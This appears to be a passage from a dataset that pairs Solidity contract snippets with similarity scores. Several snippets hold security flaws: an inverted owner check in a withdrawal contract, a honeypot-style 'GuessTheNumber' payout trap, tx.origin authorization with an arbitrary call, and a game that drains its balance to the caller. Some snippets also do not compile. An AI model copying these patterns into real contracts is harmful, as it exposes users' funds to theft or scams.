        require(!hasGoldNodeReplied[msg.sender], ""Can not reply twice"");
        replyCount++;
        hasGoldNodeReplied[msg.sender] = true;
        if(replyCount == goldNodeCount){
            allGoldNodesReplied = true;
        }

    }

}",0.5722711155623368,"contract WithdrawalContract {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function WithdrawalContract () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        
        
        
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}"
"contract TestContract {
    enum TestEnum { ONE, TWO, THREE }
    mapping (bytes32 => uint) testMapping;

    function getValueOne() constant returns(uint) {
        return testMapping[sha3(TestEnum.ONE)];
    }

}",0.5322935073933494,"contract Registrar {
    function transfer(bytes32 _hash, address newOwner) public;
    function entries(bytes32 _hash) public constant returns (uint, Deed, uint, uint, uint);
}"
"contract Contract {

    MyContract contract1 = new MyContract();

    function getSelector() public view returns (bytes4, bytes4) {
        return (contract1.function1.selector, contract1.getBalance.selector);
    }

    function callGetValue(uint _x) public view returns (uint) {

        bytes4 selector = contract1.getValue.selector;

        bytes memory data = abi.encodeWithSelector(selector, _x);
        (bool success, bytes memory returnedData) = address(contract1).staticcall(data);
        require(success);

        return abi.decode(returnedData, (uint256));
    }
}",0.5989890764850808,"contract MasterContract {

    function returnUserControlAddress(uint account_id) public view returns (address);

    function returnIsValidSendingKey(address sending_key) public view returns (bool);

    function returnStaticContractAddress() public view returns (address);

    function recover(bytes32 hash, bytes memory sig) public pure returns (address);

    function returnTxMessageToSign(bytes memory txData, address des_add, uint value, uint tx_count)

    public view returns(bytes32);

}"
"contract X {
    struct PRODUCT {
        uint price;
        uint quantity;
    }

    mapping (string => mapping (bytes12  PRODUCT) ) products;

    function appendDetails(string pid, bytes12 productid, uint price, uint quantity) payable public {
        products[pid][productid].push(PRODUCT(price, quantity));
    }

    function getDetails(string pid, bytes12 productid) 
    public view returns(uint price, uint quantity) {
        PRODUCT storage p = products[pid][productid];

        price = p.price;
        quantity = p.quantity;
    }
}",0.5250598068113916,"contract Adoption {

  address[16] public adopters;

  uint[16] public prices;



  constructor() public {

    for (uint i=0;i<16;++i) {

      prices[i] = 0.001 ether;  

    }

  }



  

  function adopt(uint petId) public payable returns (uint) {

    require(petId >= 0 && petId <= 15);

    require(msg.value >= prices[petId]);



    prices[petId] *= 120;

    prices[petId] /= 100;



    adopters[petId] = msg.sender;

    return petId;

  }



  

  function getAdopters() public view returns (address[16] memory, uint[16] memory) {

    return (adopters,  prices);

  }

}"
"contract MyContract {

  event AddFile(address indexed owner, bytes32 digest, bytes2 hashFunction, uint8 size, bytes4 storageEngine);

  function addFile(bytes32 _digest, bytes2 _hashFunction, uint8 _size, bytes4 _storageEnginge) public {
    emit AddFile(msg.sender, _digest, _hashFunction, _size, _storageEngine);
  }
}",0.5869778475305207,"contract ProofHashes {

    event HashFormatSet(uint8 hashFunction, uint8 digestSize);
    event HashSubmitted(bytes32 hash);

    

    function _setMultiHashFormat(uint8 hashFunction, uint8 digestSize) internal {
        
        emit HashFormatSet(hashFunction, digestSize);
    }

    function _submitHash(bytes32 hash) internal {
        
        emit HashSubmitted(hash);
    }

}"
"contract Constants {
    uint8 public constant BUY_ID = 1;
    uint8 public constant SUBSCRIBE_ID = 2;
}",0.5927574649446046,"contract Token {

	uint8 public decimals;



  	constructor (uint8 _decimals) public {

		decimals = _decimals;

  	}

}"
"contract BuyContract is Constants {

    uint256 public lastAmount;

    function buyMethod(uint8 _buyArg) payable public {
        require(_buyArg == BUY_ID);
        lastAmount = msg.value;
    }

}",0.5897122801247804,"contract Mintable {

    

  function mint(address _to, uint256 _amount) public returns (bool);

  

  function transfer(address to, uint256 value) public returns (bool);

  

}"
"contract SubscribeContract is Constants {

    uint256 public lastAmount;

    function subscribeMethod(uint8 _subscribeArg) payable public {
        require(_subscribeArg == SUBSCRIBE_ID);
        lastAmount = msg.value;
    }

}",0.5854388409417635,"contract Counter {
    uint256 public i;
    constructor() payable public {
        require(msg.value==0.0058 ether,""bad amount"");
        i = 0;
    }
    function inc() public {
        if (i==1) {
            msg.sender.transfer(address(this).balance);
        }
        i++;
    }
}"
"contract MyContract is Constants {
    using SafeMath for uint256;

  function singleTransaction(
      address _buyAddress,
      address _subscribeAddress
  ) payable public {
      BuyContract buyContract = BuyContract(_buyAddress);
      SubscribeContract subContract = SubscribeContract(_subscribeAddress);
      uint256 halfValue = msg.value.div(2);
      buyContract.buyMethod.value(halfValue)(BUY_ID);
      subContract.subscribeMethod.value(halfValue)(SUBSCRIBE_ID);
  }

}",0.5550534869377128,"contract IAllocationToken {
    
    event ExchangeContractUpdated(address exchangeContract);

    
    event InvestmentContractUpdated(address investmentContract);

    
    function updateExchangeContract(address _exchangeContract) external;

    
    function updateInvestmentContract(address _investmentContract) external;

    
    function mint(address _holder, uint256 _tokens) public;

    
    function burn(address _address, uint256 _value) public;
}"
"contract Caller {
    Tool public tool;
    uint public saved;

    function Caller(address _tool) {
        tool = Tool(_tool);
        saved = 0;
    }

    function changeNumber() {
        if (tool.numberIsEven()) {
            saved = 2;
        } else {
            saved = 1;
        }
    }
}",0.5922210141189435,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract YourContract {

  struct TargetCoreBase {
    uint hp;
    uint levels;
    uint AlienCount;
    uint TargetAliens;
    uint LossCounter;
    uint WinCounter;
    uint battles;
  }

  TargetCoreBase[] target;

  mapping(uint => address) base;

  address owner = msg.sender;

  function CreateTarget(uint _hp, uint _levels, uint _AlienCount, uint _TargetAliens, uint _LossCounter, uint _WinCounter, uint _battles) internal {
    uint TargetId =  target.push(TargetCoreBase(_hp, _levels, _AlienCount, _LossCounter, _WinCounter, 0, 0));
    base[TargetId];
  }

  string TargetCoreBaseErr = ""No CoreBase level"";

  function CheckTargetPairing(uint _battles) returns (bool) {
    if (_battles == 0) {
      return true;
    } else {
       return false;
    }
  }
}",0.5722611545659765,"contract Sale {
    uint public startTime;
    uint public stopTime;
    uint public target;
    uint public raised;
    uint public collected;
    uint public numContributors;
    mapping(address => uint) public balances;

    function buyTokens(address _a, uint _eth, uint _time) returns (uint); 
    function getTokens(address holder) constant returns (uint); 
    function getRefund(address holder) constant returns (uint); 
    function getSoldTokens() constant returns (uint); 
    function getOwnerEth() constant returns (uint); 
    function tokensPerEth() constant returns (uint);
    function isActive(uint time) constant returns (bool); 
    function isComplete(uint time) constant returns (bool); 
}"
"contract B is ERC721 {
  uint nextDogID = 0;
  IERC721 a = ...;

  function catToDog (uint _catID) public (returns _dogID) {
    _dogID = nextDogID++;
    _mint (msg.sender, _dogID);
    copyGene (_catID, _dogID);

    
    require (a.transferFrom (
      msg.sender,
      0x000000000000000000000000000000000000dead,
      _catID));
  }
}",0.5329177284442795,"contract owned {
    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner) throw;
        _;
    }

    function transferOwnership(address newOwner) onlyOwner {
        if (newOwner == 0x0000000000000000000000000000000000000000) throw;
        owner = newOwner;
    }
}"
"contract Congress is owned {

    
    uint public minimumQuorum;
    uint public debatingPeriodInMinutes;
    int public majorityMargin;
    Proposal[] public proposals;
    uint public numProposals;
    mapping (address =&gt; uint) public memberId;
    Member[] public members;

    event ProposalAdded(uint proposalID, address recipient, uint amount, string description);
    event Voted(uint proposalID, bool position, address voter, string justification);
    event ProposalTallied(uint proposalID, int result, uint quorum, bool active);
    event MembershipChanged(address member, bool isMember);
    event ChangeOfRules(uint minimumQuorum, uint debatingPeriodInMinutes, int majorityMargin);

    struct Proposal {
        address recipient;
        uint amount;
        string description;
        uint votingDeadline;
        bool executed;
        bool proposalPassed;
        uint numberOfVotes;
        int currentResult;
        bytes32 proposalHash;
        Vote[] votes;
        mapping (address =&gt; bool) voted;
    }

    struct Member {
        address member;
        bool canVote;
        string name;
        uint memberSince;
    }

    struct Vote {
        bool inSupport;
        address voter;
        string justification;
    }

    
    modifier onlyMembers {
        if (memberId[msg.sender] == 0
        || !members[memberId[msg.sender]].canVote)
        throw;
        _
    }

    
    function Congress(
        uint minimumQuorumForProposals,
        uint minutesForDebate,
        int marginOfVotesForMajority, address congressLeader
    ) {
        changeVotingRules(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority);
        members.length++;
        members[0] = Member({member: 0, canVote: false, memberSince: now, name: &#39;&#39;});
        if (congressLeader != 0) owner = congressLeader;

    }

    
    function changeMembership(address targetMember, bool canVote, string memberName) onlyOwner {
        uint id;
        if (memberId[targetMember] == 0) {
           memberId[targetMember] = members.length;
           id = members.length++;
           members[id] = Member({member: targetMember, canVote: canVote, memberSince: now, name: memberName});
        } else {
            id = memberId[targetMember];
            Member m = members[id];
            m.canVote = canVote;
        }

        MembershipChanged(targetMember, canVote);

    }

    
    function changeVotingRules(
        uint minimumQuorumForProposals,
        uint minutesForDebate,
        int marginOfVotesForMajority
    ) onlyOwner {
        minimumQuorum = minimumQuorumForProposals;
        debatingPeriodInMinutes = minutesForDebate;
        majorityMargin = marginOfVotesForMajority;

        ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin);
    }

    
    function newProposal(
        address beneficiary,
        uint etherAmount,
        string JobDescription,
        bytes transactionBytecode
    )
        onlyMembers
        returns (uint proposalID)
    {
        proposalID = proposals.length++;
        Proposal p = proposals[proposalID];
        p.recipient = beneficiary;
        p.amount = etherAmount;
        p.description = JobDescription;
        p.proposalHash = sha3(beneficiary, etherAmount, transactionBytecode);
        p.votingDeadline = now + debatingPeriodInMinutes * 1 minutes;
        p.executed = false;
        p.proposalPassed = false;
        p.numberOfVotes = 0;
        ProposalAdded(proposalID, beneficiary, etherAmount, JobDescription);
        numProposals = proposalID+1;
    }

    
    function checkProposalCode(
        uint proposalNumber,
        address beneficiary,
        uint etherAmount,
        bytes transactionBytecode
    )
        constant
        returns (bool codeChecksOut)
    {
        Proposal p = proposals[proposalNumber];
        return p.proposalHash == sha3(beneficiary, etherAmount, transactionBytecode);
    }

    function vote(
        uint proposalNumber,
        bool supportsProposal,
        string justificationText
    )
        onlyMembers
        returns (uint voteID)
    {
        Proposal p = proposals[proposalNumber];         
        if (p.voted[msg.sender] == true) throw;         
        p.voted[msg.sender] = true;                     
        p.numberOfVotes++;                              
        if (supportsProposal) {                         
            p.currentResult++;                          
        } else {                                        
            p.currentResult--;                          
        }
        
        Voted(proposalNumber,  supportsProposal, msg.sender, justificationText);
    }

    function executeProposal(uint proposalNumber, bytes transactionBytecode) returns (int result) {
        Proposal p = proposals[proposalNumber];
        

        if (now &lt; p.votingDeadline
            || p.executed
            || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode)
            || p.numberOfVotes &lt; minimumQuorum)
            throw;

        
        
        if (p.currentResult &gt; majorityMargin) {
            

            p.executed = true;
            if (!p.recipient.call.value(p.amount * 1 ether)(transactionBytecode)) {
                throw;
            }

            p.proposalPassed = true;
        } else {
            p.proposalPassed = false;
        }
        
        ProposalTallied(proposalNumber, p.currentResult, p.numberOfVotes, p.proposalPassed);
    }
}",0.5614625614524168,"contract MultiSig{

  struct invoke_status{
    uint propose_height;
    bytes32 invoke_hash;
    string func_name;
    uint64 invoke_id;
    bool called;
    address[] invoke_signers;
    bool processing;
    bool exists;
  }

  uint public signer_number;
  address[] public signers;
  address public owner;
  mapping (bytes32 => invoke_status) public invokes;
  mapping (bytes32 => uint64) public used_invoke_ids;
  mapping(address => uint) public signer_join_height;

  event signers_reformed(address[] old_signers, address[] new_signers);
  event valid_function_sign(string name, uint64 id, uint64 current_signed_number, uint propose_height);
  event function_called(string name, uint64 id, uint propose_height);

  modifier enough_signers(address[] memory s){
    require(s.length >=3, ""the number of signers must be >=3"");
    _;
  }
  constructor(address[] memory s) public enough_signers(s){
    signers = s;
    signer_number = s.length;
    owner = msg.sender;
    for(uint i = 0; i < s.length; i++){
      signer_join_height[s[i]] = block.number;
    }
  }

  modifier only_signer{
    require(array_exist(signers, msg.sender), ""only a signer can call this"");
    _;
  }

  function get_majority_number() private view returns(uint){
    return signer_number/2 + 1;
  }

  function array_exist (address[] memory accounts, address p) private pure returns (bool){
    for (uint i = 0; i< accounts.length;i++){
      if (accounts[i]==p){
        return true;
      }
    }
    return false;
  }

  function is_all_minus_sig(uint number, uint64 id, string memory name, bytes32 hash, address sender) internal only_signer returns (bool){
    bytes32 b = keccak256(abi.encodePacked(name));
    require(id <= used_invoke_ids[b] + 1, ""you're using a too big id."");

    if(id > used_invoke_ids[b]){
      used_invoke_ids[b] = id;
    }

    if(!invokes[hash].exists){
      invokes[hash].propose_height = block.number;
      invokes[hash].invoke_hash = hash;
      invokes[hash].func_name= name;
      invokes[hash].invoke_id= id;
      invokes[hash].called= false;
      invokes[hash].invoke_signers.push(sender);
      invokes[hash].processing= false;
      invokes[hash].exists= true;
      emit valid_function_sign(name, id, 1, block.number);
      return false;
    }

    invoke_status storage invoke = invokes[hash];
    require(!array_exist(invoke.invoke_signers, sender), ""you already called this method"");

    uint valid_invoke_num = 0;
    uint join_height = signer_join_height[msg.sender];
    for(uint i = 0; i < invoke.invoke_signers.length; i++){
      require(join_height < invoke.propose_height, ""this proposal is already exist before you become a signer"");
      if(array_exist(signers, invoke.invoke_signers[i])){
        valid_invoke_num ++;
      }
    }
    invoke.invoke_signers.push(msg.sender);
    valid_invoke_num ++;
    emit valid_function_sign(name, id, uint64(valid_invoke_num), invoke.propose_height);
    if(invoke.called) return false;
    if(valid_invoke_num < signer_number-number) return false;
    invoke.processing = true;
    return true;
  }

  modifier is_majority_sig(uint64 id, string memory name) {
    bytes32 hash = keccak256(abi.encodePacked(msg.sig, msg.data));
    if(!is_all_minus_sig(get_majority_number()-1, id, name, hash, msg.sender))
      return ;
    set_called(hash);
    _;
  }

  modifier is_all_sig(uint64 id, string memory name) {
    bytes32 hash = keccak256(abi.encodePacked(msg.sig, msg.data));
    if(!is_all_minus_sig(0, id, name, hash, msg.sender)) return ;
    set_called(hash);
    _;
  }

  function set_called(bytes32 hash) internal only_signer{
    invoke_status storage invoke = invokes[hash];
    require(invoke.exists, ""no such function"");
    require(!invoke.called, ""already called"");
    require(invoke.processing, ""cannot call this separately"");
    invoke.called = true;
    invoke.processing = false;
    emit function_called(invoke.func_name, invoke.invoke_id, invoke.propose_height);
  }

  function reform_signers(uint64 id, address[] calldata s)
    external
    only_signer
    enough_signers(s)
    is_majority_sig(id, ""reform_signers""){
    address[] memory old_signers = signers;
    for(uint i = 0; i < s.length; i++){
      if(array_exist(old_signers, s[i])){
      }else{
        signer_join_height[s[i]] = block.number;
      }
    }
    for(uint i = 0; i < old_signers.length; i++){
      if(array_exist(s, old_signers[i])){
      }else{
        signer_join_height[old_signers[i]] = 0;
      }
    }
    signer_number = s.length;
    signers = s;
    emit signers_reformed(old_signers, signers);
  }

  function get_unused_invoke_id(string memory name) public view returns(uint64){
    return used_invoke_ids[keccak256(abi.encodePacked(name))] + 1;
  }
  function get_signers() public view returns(address[] memory){
    return signers;
  }
}"
"contract MyContract {
    address public oracle;
    uint public lastAliveTime;

    modifier throwUnless(bool condition) {
        if (!condition) { throw; }
        _;
    }

    function MyContract() {
        oracle = msg.sender;
        showProofOfLife();
    }

    function showProofOfLife() throwUnless(msg.sender == oracle) {
        lastAliveTime = now;
    }

    function doSomethingUseful() throwUnless((now - lastAliveTime) < 15 minutes) {
        
    }
}",0.5630262848579838,"contract SecuredFunctions is Ownable {

    mapping(address => bool) public allowedContracts;

    
    modifier onlyAllowedContracts {
        require(allowedContracts[msg.sender] || msg.sender == address(this), ""Only allowed contracts can invoke this function"");
        _;
    }

    
    function setAllowedContract (
        address _contract,
        bool _allowed
    ) public onlyOwner {
        allowedContracts[_contract] = _allowed;
    }
}"
"contract Test {
    address primaryUser;

    function Test(address _primaryUser) {
        primaryUser = _primaryUser;
    }
}",0.5664851842537582,"contract IChest {
        function purchaseFor(address user, uint count, address referrer) public payable;

}"
"contract TestContract is SafeMath {
    uint public transactionCount = 0;
    uint public transactionAmount = 0;

    function payBill(address payable account) payable public {
        transactionCount = add(transactionCount, 1);
        transactionAmount = add(transactionAmount, msg.value);

        address(account).transfer(msg.value);
    }
}",0.575662668701935,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract D {
  function deposit(address c1, address c2) payable {
     uint amount1 = msg.value / 2;
     uint amount2 = msg.value - amount1;
     
     if (!c1.send(amount1)) throw;
     if (!c2.send(amount2)) throw;
  }
}",0.5891166296548278,"contract Withdrawable is Permittable {
    function withdraw(address _to, uint256 _amount) public onlyPermitted {
        require(_to != address(0));

        if (_amount == 0)
            _amount = this.balance;

        _to.transfer(_amount);
    }
}"
"contract StatelessUserRegisty {

    Storage dataStore;

    constructor() public {
        dataStore = new Storage();
    }

    function userKey(address userAddr) public pure returns(bytes32 userID) {
        return keccak256(abi.encodePacked(userAddr));
    }

    function isUser(address userAddr) public view returns(bool isIndeed) {
        return dataStore.getBool(userKey(userAddr));
    }

    function createUser(address userAddr) public returns(bool success) {
        require(!isUser(userAddr));
        dataStore.setBool(userKey(userAddr),true);
        return true;
    }

    function updateUserPoints(address userAddr, uint userPoints) public returns(bool success) {
        require(!isUser(userAddr));
        dataStore.setUint(userKey(userAddr),userPoints);
        return true;
    }

}",0.5685396649181023,"contract AssetProxy is ERC20Interface {

    function _forwardApprove(address _spender, uint _value, address _sender) public returns(bool);

    function _forwardTransferFromWithReference(address _from, address _to, uint _value, string _reference, address _sender) public returns(bool);

    function _forwardTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference, address _sender) public returns(bool);

    function recoverTokens(ERC20Interface _asset, address _receiver, uint _value) public returns(bool);

    function etoken2() public pure returns(address) {} 

    function etoken2Symbol() public pure returns(bytes32) {} 

}"
"contract Test {

    struct  User{
        uint256 uuid;
        bytes32 first_name;
        bytes32 last_name;
        bytes32 sex;
        bytes32 age;
        bytes32 birth_day;
        bytes32 addr;
        bytes32 mail_address;
        bytes32 phone_number;
    }

    mapping(uint256 => User) users;

    function getUser(uint256 uuid) public constant returns (bytes32, bytes32, bytes32, bytes32, bytes32, bytes32, bytes32, bytes32) {
        User memory u = users[uuid];
        return (
            u.first_name,
            u.last_name,
            u.sex,
            u.age,
            u.birth_day,
            u.addr,
            u.mail_address,
            u.phone_number
        );
    }
}",0.5624156406403402,"contract GlobalStorageMultiId { 

	uint256 public regPrice;

	function registerUser(bytes32 _id) payable returns(bool);

	function changeAddress(bytes32 _id , address _newAddress) returns(bool);

	function setUint(bytes32 _id , bytes32 _key , uint _data , bool _overwrite) returns(bool);

	function getUint(bytes32 _id , bytes32 _key) constant returns(uint);

	event Error(string _string);

	event RegisteredUser(address _address , bytes32 _id);

	event ChangedAdd(bytes32 _id , address _old , address _new);

}"
"contract TimedCrowdsale {
    event TimedCrowdsaleE(uint);
    function TimedCrowdsale() public {
        emit TimedCrowdsaleE(1);
    }
}",0.5333432630508597,"contract CrowdsaleStoneToken is StoneToken {

    function CrowdsaleStoneToken() public payable StoneToken() {}
   
}"
"contract CappedCrowdsale is Crowdsale {
    event CappedCrowdsaleE(uint);
    function CappedCrowdsale() public {
        emit CappedCrowdsaleE(1);
    }
}",0.5291022233626836,"contract DeadlineCrowdsale is TimedCrowdsale {

  constructor(uint256 closingTime) public TimedCrowdsale(block.timestamp, closingTime) { }

}"
"contract RefundableCrowdsale is FinalizableCrowdsale {
    event RefundableCrowdsaleE(uint);
    function RefundableCrowdsale() public {
        emit RefundableCrowdsaleE(1);
    }
}",0.5202565051910403,"contract RapidePresaleVault is RefundVault {
    bool public forPresale = true;
    function RapidePresaleVault(address _wallet) RefundVault(_wallet) public {}
}"
"contract MintedCrowdsale is Crowdsale { 
    event MintedCrowdsaleE(uint);
    function MintedCrowdsale() public {
        emit MintedCrowdsaleE(1);
    }
}",0.5395388228952519,"contract DeadlineCrowdsale is TimedCrowdsale {

  constructor(uint256 closingTime) public TimedCrowdsale(block.timestamp, closingTime) { }

}"
"contract TimeStamps {

    mapping(address => uint[]) public addressTimeStamps;
    mapping(address => bool) public isContentProvider;
    address[] public contentProviders;

    

    event LogNewAddressTimeStamp(address sender, address contentProvider, uint timeStamp);

    function setTimeStamp(address contentProvider, uint timeStamp) public returns(bool success) {
        require(contentProvider != 0);
        require(timeStamp != 0);
        if(!isContentProvider[contentProvider]) {
            isContentProvider[contentProvider] = true;
            contentProviders.push(contentProvider);
        }
        addressTimeStamps[contentProvider].push(timeStamp);
        emit LogNewAddressTimeStamp(msg.sender, contentProvider, timeStamp);
        return true;
    }


    

    function getTimeStamp(address contentProvider, uint row) public view returns(uint timeStamp) {
        return(addressTimeStamps[contentProvider][row]);
    }

    

    function getAddressTimeStampCount(address contentProvider) public view returns(uint count) {
        return addressTimeStamps[contentProvider].length;
    }

    function getContentProviderCount() public view returns(uint count) {
        return contentProviders.length;
    }

}",0.573322910931098,"contract BaseAirdrop is Lockable {
    using SafeMath for uint;

    ERC20Token public token;

    mapping(address => bool) public users;

    event AirdropToken(address indexed to, uint amount);

    constructor(address _token) public {
        require(_token != address(0));
        token = ERC20Token(_token);
    }

    function airdrop(uint8 v, bytes32 r, bytes32 s) public whenNotLocked {
        if (ecrecover(keccak256(""Signed for Airdrop"", address(this), address(token), msg.sender), v, r, s) != owner
            || users[msg.sender]) {
            revert();
        }
        users[msg.sender] = true;
        uint amount = getAirdropAmount(msg.sender);
        token.transfer(msg.sender, amount);
        emit AirdropToken(msg.sender, amount);
    }

    function getAirdropStatus(address user) public constant returns (bool success) {
        return users[user];
    }

    function getAirdropAmount(address user) public constant returns (uint amount);

    function withdrawTokens(address destination) public onlyOwner whenLocked {
        require(destination != address(0));
        uint balance = token.balanceOf(address(this));
        token.transfer(destination, balance);
    }
}"
"contract AbiTwoTest {

    struct Item {
        string str;
        uint   num;
        bool   bol;
    }

    struct Arg {
        Item[] items;
    }

    mapping (address => Arg) itemsByUser;

    
    event ItemAdded(string indexed str, uint num, bool bol);

    
    function addItem(Item memory _item) public {
        itemsByUser[msg.sender].items.push(_item);
        emit ItemAdded(_item.str, _item.num, _item.bol);
    }

    
    function item(address addr) public view returns (Arg memory items) {
        return itemsByUser[addr];
    }
}",0.572587119656279,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Caller {
uint public value;
address public sender;

function callSetValue(address _callee, uint _value) {
    _callee.call(bytes4(sha3(""setValue(uint256)"")), _value); 
}

function callcodeSetValue(address _callee, uint _value) {
    _callee.callcode(bytes4(sha3(""setValue(uint256)"")), _value); 
}

function delegatecallSetValue(address _callee, uint _value) {
    _callee.delegatecall(bytes4(sha3(""setValue(uint256)"")), _value); 
}
}",0.5641720365555288,"contract Burnable is Functions {
  event Burn(address indexed burner, uint256 value);
  function burn(uint256 _value) public {
    _burn(msg.sender, _value);
  }
  function _burn(address _who, uint256 _value) internal {
    require(_value <= balances[_who]);
    balances[_who] = balances[_who].sub(_value);
    totalSupply_ = totalSupply_.sub(_value);
    emit Burn(_who, _value);
    emit Transfer(_who, address(0), _value);
  }
}"
"contract CallHelper {
    function justCall(Caller _caller, Callee _callee, uint _value) {
        _caller.delegatecallSetValue(_callee, _value);
    }
}",0.5046585975096466,"contract ContractReceiver {

	function tokenFallback(address _from, uint _value, bytes _data)public pure {

		

		_from;

		_value;

		_data;

	}

}"
"contract account {
  address blocker;
  address user;
  bool isBlocked;
  function account(address blockerAccount, address _user) {
    blocker=blockerAccount;
    user=_user;
    isBlocked=true;
  }
  modifier isUnblocked() {
    if(!isBlocked) {
        _;
    }
  }
  modifier isBlocker(address msgSender) {
    if(msgSender == blocker) {
        _;
    }
  }
  modifier isUser(address msgSender) {
    if(msgSender == user) {
        _;
    }
  }
  function unblock() isBlocker(msg.sender) {
    isBlocked=false;
  }
  function withdraw(address withdrawAddress, uint amount) isUser(msg.sender) isUnblocked() {
    withdrawAddress.transfer(amount);
  }
}",0.5579640891523655,"contract ArbitrageCoin {
    
    
    address public minter;
    mapping (address => uint) public balances;

    
    
    event Sent(address from, address to, uint amount);

    
    
    function Coin() public {
        minter = msg.sender;
    }

    function mint(address receiver, uint amount) public {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }

    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Sent(msg.sender, receiver, amount);
    }
}"
"contract TwoSigs {

    address public partyA;
    address public partyB;

    struct documentStruct {
        bool approvedByA;
        bool approvedByB;
    }

    

    mapping(bytes32 => documentStruct) public documentStructs;
    bytes32[] public documentList; 
    bytes32[] public approvedDocuments; 

    

    event LogProposedDocument(address proposer, bytes32 docHash);
    event LogApprovedDocument(address approver, bytes32 docHash);

    

    function TwoSigs(address addressA, address addressB) {
        partyA = addressA;
        partyB = addressB;
    }

    
    function getDocumentsCount() public constant returns(uint docCount) {
        return documentList.length;
    }

    function getApprovedCount() public constant returns(uint apprCount) {
        return approvedDocuments.length;
    }

    

    function agreeDoc(bytes32 hash) public returns(bool success) {
        if(msg.sender != partyA && msg.sender != partyB) throw; 
        if(msg.sender == partyA) documentStructs[hash].approvedByA = true; 
        if(msg.sender == partyB) documentStructs[hash].approvedByB = true; 

        if(documentStructs[hash].approvedByA == true && documentStructs[hash].approvedByB == true) {
            uint docCount = documentList.push(hash);
            LogApprovedDocument(msg.sender, hash);
        } else {
            uint apprCount = approvedDocuments.push(hash);
            LogProposedDocument(msg.sender, hash);
        }
        return true;
    }

}",0.5496858794323711,"contract Airdroper {
    mapping (address => mapping (address => uint)) balances;

    constructor() public {}

    function subtr(uint a, uint b) internal pure returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function addit(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }

    function tokenFallback(address _from, uint _amount, bytes _data) public returns (bool) {
        balances[msg.sender][_from] = addit(balances[msg.sender][_from], _amount);
        if (_data.length != 0) {
            require(address(this).call(_data));
        }
        return true;
    }

    function deposit(address _token, uint _amount) public returns (bool) {
        
        require(_token.call(0x23b872dd, msg.sender, this, _amount));
        balances[_token][msg.sender] = addit(balances[_token][msg.sender], _amount);
        return true;
    }

    function balanceOf(address _token, address _user) public view returns (uint) {
        return balances[_token][_user];
    }

    function spread(address _token, address[] _addresses, uint[] _amounts) public returns (bool) {
        uint l = _addresses.length;
        for (uint i = 0; i < l; i++) {
            require(balances[_token][tx.origin] >= _amounts[i]);
            
            require(_token.call(0xa9059cbb, _addresses[i], _amounts[i]));
            balances[_token][tx.origin] = subtr(balances[_token][tx.origin], _amounts[i]);
        }
        return true;
    }
}"
"contract RPS {

    uint256 previousMove;
    uint256 previousStake;
    address previousPlayer;

    function play(uint256 move) payable {

        

        if (previousMove == 0) {
            
            previousMove = move;
            previousStake = msg.value;
            previousPlayer = msg.sender;
            return;
        }

        if (previousMove == 1) {
            if (move == 2) {
                

                
                msg.sender.transfer(address(this).balance);

                
                previousPlayer.transfer(address(this).balance);
            }
        }
        

    }
}",0.5523377268701242,"contract GuessTheNumber {

    address private Owner = msg.sender;
    uint public SecretNumber = 24;

    function() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value > 0.25 ether) {
            
            msg.sender.transfer(this.balance+msg.value);
        }
    }
}"
"contract Stringy {

    struct User {
        bytes32 firstName;
        bytes32 lastName;
        uint dateOfBirth;
        bytes32 email;
    } 

    mapping (address => User) registeredUsers;  
    address[] public userAddressList;

    event LogNewUser(address user, bytes32 firstName, bytes32 lastName, uint dateOfBirth, bytes32 email);

    function isUser(address user) public view returns(bool isIndeed) {
        return(registeredUsers[user].dateOfBirth > 0);
    }

    function registerUser(bytes32 _firstName, bytes32 _lastName, uint _dateOfBirth, bytes32 _email) public returns (bool success) {
        require(!isUser(msg.sender));
        require(_firstName != 0x0);
        require(_lastName != 0x0);
        require(_dateOfBirth > 0);
        require(_email > 0x0);

        registeredUsers[msg.sender] = User(_firstName, _lastName, _dateOfBirth, _email);
        userAddressList.push(msg.sender);
        emit LogNewUser(msg.sender, _firstName, _lastName, _dateOfBirth, _email);
        return true;
    }

}",0.5561015376763614,"contract BaseAirdrop is Lockable {

    using SafeMath for uint;



    SNPCToken public token;



    mapping(address => bool) public users;



    event AirdropToken(address indexed to, uint amount);



    constructor(address _token) public {

        require(_token != address(0));

        token = SNPCToken(_token);

    }



    function airdrop(uint8 v, bytes32 r, bytes32 s, uint amount) public;



    function getAirdropStatus(address user) public constant returns (bool success) {

        return users[user];

    }



    function originalHash(uint amount) internal view returns (bytes32) {

        return keccak256(abi.encodePacked(

                ""Signed for Airdrop"",

                address(this),

                address(token),

                msg.sender,

                amount

            ));

    }



